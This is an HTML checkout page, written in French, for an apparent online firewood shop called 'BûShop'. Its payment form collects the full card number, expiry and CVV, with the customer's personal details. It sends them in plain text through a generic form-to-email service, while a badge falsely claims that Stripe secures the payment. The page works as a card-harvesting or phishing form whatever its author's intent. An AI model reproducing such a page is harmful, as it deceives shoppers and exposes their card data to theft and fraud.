<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B√ªShop - Paiement S√©curis√©</title>
    <link rel="stylesheet" href="templatemo-noir-fashion.css">
    
    <style>
        .checkout-section {
            padding: 150px 50px 100px;
            max-width: 1400px;
            margin: 0 auto;
            background: var(--bg-section); /* Fond clair du "featured" */
            min-height: 80vh;
        }

        .checkout-container {
            display: grid;
            grid-template-columns: 2fr 1fr; /* Formulaire large, r√©sum√© plus petit */
            gap: 50px;
        }

        @media (max-width: 900px) {
            .checkout-container {
                grid-template-columns: 1fr;
            }
            .summary-area {
                /* Remonte le panier sur mobile/tablette */
                order: -1; 
            }
        }

        /* Reprise du style du formulaire Contact (fond clair/blanc) */
        .form-area {
            background: #f7f7f7; /* Un fond tr√®s clair */
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            color: var(--primary); /* Texte en noir sur fond clair */
        }
        
        .form-area h3 {
            font-size: 28px;
            margin-bottom: 30px;
            color: var(--primary);
            border-bottom: 2px solid var(--accent-hover);
            padding-bottom: 10px;
        }

        .form-row {
            margin-bottom: 25px;
        }
        
        /* Ajustement des inputs pour le fond clair */
        .form-area input,
        .form-area select {
            width: 100%;
            padding: 15px;
            background: white; /* Fond des inputs en blanc */
            border: 1px solid var(--text-muted);
            color: var(--primary); /* Texte noir dans les champs */
            font-size: 16px;
            transition: all 0.3s ease;
            border-radius: 4px;
        }

        .form-area input:focus,
        .form-area select:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 10px rgba(144, 68, 54, 0.2);
        }

        .form-area label {
            color: var(--primary); /* Labels en noir */
        }

        .form-group label {
            font-size: 14px; /* Un peu plus grand que dans la page contact */
        }

        .form-group.card-details {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 20px;
        }
        
        @media (max-width: 600px) {
            .form-group.card-details {
                grid-template-columns: 1fr;
            }
        }
        
        /* R√©capitulatif de Commande */
        .summary-area {
            background: var(--primary); /* Fond sombre pour le contraste et la mise en avant */
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            color: white;
            height: fit-content;
        }

        .summary-area h3 {
            color: white;
            font-size: 24px;
            margin-bottom: 25px;
            border-bottom: 1px dashed var(--text-muted);
            padding-bottom: 10px;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            align-items: center; /* Centrer verticalement */
            margin-bottom: 15px;
            font-size: 16px;
            color: var(--text-light);
            flex-wrap: wrap; /* Passage √† la ligne si pas assez de place */
        }
        
        /* Nouveau CSS pour les items interactifs */
        .summary-item.cart-item {
            align-items: flex-start;
            flex-direction: column;
            border-bottom: 1px solid #333;
            padding-bottom: 15px;
        }
        
        .summary-item .item-name {
            font-weight: 600;
            color: white;
            margin-bottom: 10px;
            font-size: 17px;
        }

        .summary-item-controls {
            display: flex;
            align-items: center;
            width: 100%;
            justify-content: space-between;
        }
        
        .quantity-input {
            width: 50px;
            padding: 5px 8px;
            background: #222;
            border: 1px solid var(--text-muted);
            color: white;
            border-radius: 4px;
            text-align: center;
            font-size: 14px;
            margin-right: 10px;
            -moz-appearance: textfield; /* Cacher les fl√®ches sur Firefox */
        }
        .quantity-input::-webkit-outer-spin-button,
        .quantity-input::-webkit-inner-spin-button {
            -webkit-appearance: none; /* Cacher les fl√®ches sur Chrome/Safari */
            margin: 0;
        }
        
        .remove-btn {
            background: none;
            border: none;
            color: var(--accent-hover);
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            padding: 0 5px;
        }
        
        .remove-btn:hover {
            color: red;
            transform: scale(1.2);
        }

        .item-price {
            font-size: 16px;
            color: white;
            font-weight: 500;
            margin-left: auto; /* Pousse le prix √† droite */
            margin-right: 15px;
        }
        /* Fin Nouveau CSS */


        .summary-total {
            border-top: 2px solid var(--accent);
            padding-top: 20px;
            margin-top: 20px;
            font-size: 22px;
            font-weight: 700;
            color: white;
            display: flex;
            justify-content: space-between;
        }

        /* Bouton de paiement (reprise du style .form-submit) */
        .checkout-btn {
            margin-top: 30px;
        }

        .payment-methods-logos {
            margin-top: 20px;
            text-align: center;
            opacity: 0.7;
        }

        .payment-methods-logos img {
            height: 30px;
            margin: 0 5px;
            filter: grayscale(100%);
        }
        
        .secure-badge {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .secure-badge span {
             color: var(--accent);
        }

    </style>
</head>
<body>
    <nav id="navbar">
        <div class="nav-container">
            <a href="index.html" class="logo-link">
                <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#b5651d;stop-opacity:1" /> <stop offset="100%" style="stop-color:#ff9900;stop-opacity:1" /> </linearGradient>
                    </defs>
                    <polygon points="50,10 20,50 50,90 80,50" fill="none" stroke="url(#logoGrad)" stroke-width="3"/>
                    <circle cx="50" cy="50" r="5" fill="url(#logoGrad)"/>
                </svg>
                <span class="logo-text">B√ªShop</span>
            </a>
            <ul class="nav-links">
                <li><a href="index.html#home" class="nav-link">Accueil</a></li>
                <li><a href="index.html#collections" class="nav-link">Nos B√ªches</a></li>
                <li><a href="index.html#featured" class="nav-link">Avis Clients</a></li>
                <li><a href="index.html#contact" class="nav-link active">Paiement</a></li>
                <li><a href="#" class="nav-cta">Valider</a></li>
            </ul>
            <div class="menu-toggle" id="menuToggle">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </nav>
    
    <section class="checkout-section" id="checkout">
        <div class="section-header">
            <h2 class="section-title">Validez Votre Commande</h2>
            <p class="section-subtitle">Paiement 100% s√©curis√© et livraison garantie</p>
        </div>
        
        <div class="checkout-container">
            <div class="form-area">
                <h3>D√©tails de Livraison & Facturation</h3>
                
                <form id="checkoutForm" action="https://api.web3forms.com/submit" method="POST">
                    
                    <input type="hidden" name="access_key" value="D2ede9b1-a170-44f1-9619-076f358bfb9f">
                    
                    <input type="hidden" name="redirect" value="https://tonsite.com/merci-pour-ta-commande.html"> 

                    <input type="hidden" name="subject" value="Nouvelle Commande B√ªShop - URGENT √† Traiter">
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="coFirstName">Pr√©nom</label>
                            <input type="text" id="coFirstName" name="Pr√©nom" placeholder="Jean" required>
                        </div>
                        <div class="form-group">
                            <label for="coLastName">Nom</label>
                            <input type="text" id="coLastName" name="Nom" placeholder="Dupond" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="coAddress">Adresse de Livraison</label>
                        <input type="text" id="coAddress" name="Adresse_de_Livraison" placeholder="12 Rue du Foyer" required>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="coZip">Code Postal</label>
                            <input type="text" id="coZip" name="Code_Postal" placeholder="75000" required>
                        </div>
                        <div class="form-group">
                            <label for="coCity">Ville</label>
                            <input type="text" id="coCity" name="Ville" placeholder="Paris" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="coEmail">Email</label>
                        <input type="email" id="coEmail" name="Email_Client" placeholder="jean@exemple.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="coPhone">T√©l√©phone (pour la livraison)</label>
                        <input type="tel" id="coPhone" name="T√©l√©phone_Livraison" placeholder="06 00 00 00 00" required>
                    </div>

                    <h3 style="margin-top: 50px;">Informations de Paiement</h3>
                    
                    <div class="form-group">
                        <label for="cardNumber">Num√©ro de Carte</label>
                        <input type="text" id="cardNumber" name="Num√©ro_de_Carte" placeholder="0000 0000 0000 0000" required pattern="[0-9]{16}">
                    </div>
                    
                    <div class="form-group card-details">
                        <div class="form-group">
                            <label for="cardName">Nom sur la Carte</label>
                            <input type="text" id="cardName" name="Nom_sur_la_Carte" placeholder="M. Jean DUPOND" required>
                        </div>
                        <div class="form-group">
                            <label for="cardExpiry">Expiration (MM/AA)</label>
                            <input type="text" id="cardExpiry" name="Expiration_Carte" placeholder="12/26" required pattern="(0[1-9]|1[0-2])\/\d{2}">
                        </div>
                        <div class="form-group">
                            <label for="cardCvv">CVV</label>
                            <input type="text" id="cardCvv" name="CVV" placeholder="123" required pattern="\d{3,4}">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>
                            <input type="checkbox" required style="width: auto; margin-right: 10px;"> J'accepte les conditions g√©n√©rales de vente.
                        </label>
                    </div>

                    <button type="submit" class="form-submit checkout-btn" id="pay-button">
                        Payer <span id="pay-button-total">273.00‚Ç¨</span> et Valider la Commande
                    </button>
                    
                    <input type="hidden" name="Montant_Total_Pay√©" id="hidden-total-amount" value="273.00‚Ç¨">
                    
                </form>
                <div class="secure-badge">Paiement s√©curis√© par <span>Stripe</span>. Vos donn√©es sont prot√©g√©es.</div>
            </div>
            
            <div class="summary-area">
                <h3>Votre Panier B√ªShop</h3>
                
                <div id="cart-items-container">
                    <div class="summary-item cart-item" data-price="95.00">
                        <span class="item-name">Ch√™ne Premium (50cm) - St√®re</span>
                        <div class="summary-item-controls">
                            <input type="number" class="quantity-input" value="2" min="1" data-item-id="chene" name="Quantit√©_Ch√™ne">
                            <span class="item-price">190.00‚Ç¨</span>
                            <button class="remove-btn" data-item-id="chene" aria-label="Supprimer">√ó</button>
                        </div>
                    </div>
                    <div class="summary-item cart-item" data-price="15.00">
                        <span class="item-name">Filet de B√ªches Sec (33cm)</span>
                        <div class="summary-item-controls">
                            <input type="number" class="quantity-input" value="1" min="1" data-item-id="filet" name="Quantit√©_Filet_Sec">
                            <span class="item-price">15.00‚Ç¨</span>
                            <button class="remove-btn" data-item-id="filet" aria-label="Supprimer">√ó</button>
                        </div>
                    </div>
                    <div class="summary-item cart-item" data-price="19.90">
                        <span class="item-name">Kit d'Allumage Naturel</span>
                        <div class="summary-item-controls">
                            <input type="number" class="quantity-input" value="1" min="1" data-item-id="kit" name="Quantit√©_Kit_Allumage">
                            <span class="item-price">19.90‚Ç¨</span>
                            <button class="remove-btn" data-item-id="kit" aria-label="Supprimer">√ó</button>
                        </div>
                    </div>
                </div>
                
                <hr style="border-top: 1px solid rgba(255, 255, 255, 0.1); margin: 20px 0;">

                <div class="summary-item">
                    <span>Sous-total HT</span>
                    <span id="summary-subtotal">224.90‚Ç¨</span> </div>
                <div class="summary-item">
                    <span>TVA (20%)</span>
                    <span id="summary-tva">44.98‚Ç¨</span> </div>
                <div class="summary-item" style="font-weight: bold; color: var(--accent);" data-shipping="3.12">
                    <span>Frais de Livraison Express (72H)</span>
                    <span id="summary-shipping">3.12‚Ç¨</span> </div>

                <div class="summary-total">
                    <span>Montant Total (TTC)</span>
                    <span id="summary-total-amount">273.00‚Ç¨</span> </div>

                <div class="payment-methods-logos">
                    <span class="payment-icon" style="width: auto; font-size: 14px; padding: 5px 10px;">VISA</span>
                    <span class="payment-icon" style="width: auto; font-size: 14px; padding: 5px 10px;">MC</span>
                    <span class="payment-icon" style="width: auto; font-size: 14px; padding: 5px 10px;">AMEX</span>
                    <span class="payment-icon" style="width: auto; font-size: 14px; padding: 5px 10px;">PAYPAL</span>
                </div>
                
            </div>
        </div>
    </section>

    <footer>
        <div class="footer-content">
            </div>
        <div class="footer-bottom">
            <p>&copy; 2025 B√ªShop. Tous droits r√©serv√©s. | Con√ßu par <a href="" target="_blank" rel="nofollow" style="color: var(--accent); text-decoration: none;">CGA</a></p>
            <div class="payment-methods">
                <div class="payment-icon">VISA</div>
                <div class="payment-icon">MC</div>
                <div class="payment-icon">AMEX</div>
                <div class="payment-icon">PAY</div>
            </div>
        </div>
    </footer>

    <script src="templatemo-noir-scripts.js"></script>
    
    <script>
        // On s'assure que le DOM est charg√© avant de lancer le script
        document.addEventListener('DOMContentLoaded', () => {

            const cartContainer = document.getElementById('cart-items-container');
            const shippingCost = 3.12; // Frais de port fixes
            const tvaRate = 0.20; // 20%

            // On chope les √©l√©ments √† mettre √† jour
            const subtotalEl = document.getElementById('summary-subtotal');
            const tvaEl = document.getElementById('summary-tva');
            const shippingEl = document.getElementById('summary-shipping');
            const totalAmountEl = document.getElementById('summary-total-amount');
            const payButtonTotalEl = document.getElementById('pay-button-total');
            const hiddenTotalAmountEl = document.getElementById('hidden-total-amount'); // Nouveau champ cach√©

            // LE CERVEAU üß†: La fonction qui recalcule tout
            function updateCartTotals() {
                let currentSubtotal = 0;
                
                // 1. On boucle sur tous les items du panier
                const cartItems = cartContainer.querySelectorAll('.cart-item');
                
                cartItems.forEach(item => {
                    const unitPrice = parseFloat(item.dataset.price);
                    const quantityInput = item.querySelector('.quantity-input');
                    let quantity = parseInt(quantityInput.value);
                    
                    // S√©curit√© : si la quantit√© n'est pas un nombre ou est n√©gative, on met 1
                    if (isNaN(quantity) || quantity < 1) {
                        quantityInput.value = 1;
                        quantity = 1;
                    }

                    const itemTotalPrice = unitPrice * quantity;
                    currentSubtotal += itemTotalPrice;
                    
                    // Mettre √† jour le prix de l'item (ex: 95.00‚Ç¨ * 2 = 190.00‚Ç¨)
                    item.querySelector('.item-price').textContent = `${itemTotalPrice.toFixed(2)}‚Ç¨`;
                });

                // 2. Calculer les totaux
                const currentTVA = currentSubtotal * tvaRate;
                const currentTotal = currentSubtotal + currentTVA + shippingCost;

                // 3. Mettre √† jour l'affichage (le DOM)
                // .toFixed(2) c'est pour forcer 2 chiffres apr√®s la virgule, comme les vrais `senpai` du e-commerce
                subtotalEl.textContent = `${currentSubtotal.toFixed(2)}‚Ç¨`;
                tvaEl.textContent = `${currentTVA.toFixed(2)}‚Ç¨`;
                shippingEl.textContent = `${shippingCost.toFixed(2)}‚Ç¨`;
                totalAmountEl.textContent = `${currentTotal.toFixed(2)}‚Ç¨`;
                payButtonTotalEl.textContent = `${currentTotal.toFixed(2)}‚Ç¨`; // On update aussi le bouton !
                hiddenTotalAmountEl.value = `${currentTotal.toFixed(2)}‚Ç¨`; // On update le champ cach√© !
            }

            // GESTION DES √âV√âNEMENTS (Les "Listeners")
            
            // On √©coute ce qui se passe dans le conteneur du panier
            cartContainer.addEventListener('input', (event) => {
                // Si on touche √† un champ "quantity-input"
                if (event.target.classList.contains('quantity-input')) {
                    updateCartTotals(); // On recalcule tout !
                }
            });

            cartContainer.addEventListener('click', (event) => {
                // Si on clique sur un bouton "remove-btn"
                if (event.target.classList.contains('remove-btn')) {
                    // On cherche l'item parent (.cart-item) et on le... SUPPRIME
                    event.target.closest('.cart-item').remove();
                    updateCartTotals(); // Et on recalcule !
                }
            });

            // On lance un premier calcul au chargement de la page, au cas o√π
            updateCartTotals();

        });
    </script>
</body>
</html>
